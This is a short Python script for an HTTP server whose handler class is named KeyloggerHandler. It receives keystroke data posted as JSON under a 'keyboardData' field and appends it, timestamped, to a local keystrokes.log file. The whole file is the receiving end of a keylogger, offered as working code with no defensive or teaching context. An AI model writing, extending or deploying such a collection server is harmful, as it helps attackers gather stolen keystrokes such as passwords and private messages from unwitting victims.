from http.server import BaseHTTPRequestHandler, HTTPServer
import json
from datetime import datetime

class KeyloggerHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])  # Length of the data
        post_data = self.rfile.read(content_length)  # Read the data
        try:
            data = json.loads(post_data)
            keystrokes = data.get("keyboardData", "")

            # Save to a file with timestamp
            with open("keystrokes.log", "a") as f:
                timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
                f.write(f"{timestamp} {keystrokes}\n")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Data received")
        except Exception as e:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

def run(server_class=HTTPServer, handler_class=KeyloggerHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"[+] Server running on port {port}")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
